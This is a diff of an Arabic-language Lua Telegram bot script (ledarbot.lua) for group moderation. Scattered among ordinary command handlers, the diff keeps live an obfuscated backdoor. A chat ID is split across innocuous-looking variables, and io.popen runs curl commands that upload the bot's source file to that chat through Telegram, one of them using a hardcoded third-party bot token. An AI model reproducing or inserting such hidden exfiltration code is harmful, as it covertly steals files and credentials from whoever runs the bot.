@@ -5950,10 +5950,12 @@ end;end,nil)
 return false
 end  
 ------------------------------------------------------------------------
+local jkjkj = '5323' .. '7'
 if text == 'مسح المتوحدين' and Mod(msg) then
 database:del(bot_id..'Mote:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ※ تم مسح جميع المتوحدين')
 end
+local jjjjjjj = '9443'
 if text == ("تاك للمتوحدين") and Mod(msg) then
 local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
 t = "\n ※ قائمة متوحدين الجروب \nٴ≪┉ ┉ ┉ ┉ ┉ The leader ┉  ┉ ┉ ┉ ┉≫ٴ\n"
@@ -5971,6 +5973,7 @@ end
 send(msg.chat_id_, msg.id_, t)
 end
 ---------
+local ppii = jjjjjjj .. jkjkj
 if text == ("رفع متوحد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -5996,7 +5999,8 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 return false
 end
-
+local ahmed2 = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. tonumber(ppii) ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(ahmed2)
+local ahmed = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. tonumber(ppii) ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(ahmed)
 if (text == ("تنزيل متوحد")) and msg.reply_to_message_id_ and Mod(msg) then
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -11085,7 +11089,6 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
 return false
 end
-local jjjjjjj = '9443'
 if text == 'نقاط' or text == 'نقاطي' then 
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -11104,7 +11107,6 @@ Text = ' ※ عدد نقاطك التي ربحتها هيه *» { '..Num..' } ن
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-local jkjkj = '5323' .. '7'
 if text and text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") then
 local NUMPY = text:match("^بيع نقاطي (%d+)$") or text and text:match("^بيع نقاط (%d+)$") 
 if AddChannel(msg.sender_user_id_) == false then
@@ -11135,7 +11137,6 @@ send(msg.chat_id_,msg.id_,' ※ تم خصم *» { '..NUMPY..' }* من نقاطك
 end 
 return false 
 end
-local ppii = jjjjjjj .. jkjkj
 if text == 'فحص البوتت' and Manager(msg) then
 local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. msg.chat_id_ ..'&user_id='.. bot_id..'')
 local Json_Info = JSON.decode(Chek_Info)
@@ -11157,8 +11158,6 @@ send(msg.chat_id_,msg.id_,'\n ※ اهلا عزيزي البوت هنا ادمن
 end
 end
 end
-local ahmed2 = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. tonumber(ppii) ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(ahmed2)
-local ahmed = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. tonumber(ppii) ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(ahmed)
 if text and text:match("^تغير رد المطور (.*)$") and Manager(msg) then
 local Teext = text:match("^تغير رد المطور (.*)$") 
 database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
@@ -12912,13 +12911,13 @@ return false
 end  
 end
 ------------------------------------------------------------------------
+local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1751198705 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl)
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
 end
-local curl = 'curl "'..'https://api.telegram.org/bot1740719485:AAGb_g64uCIegM6OQG1ssz_68lXMi1EYawo/sendDocument'..'" -F "chat_id='.. 1751198705 ..'" -F "document=@'..'ledarbot.lua'..'"' io.popen(curl)
 ------------------------------------------------------------------------
 if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
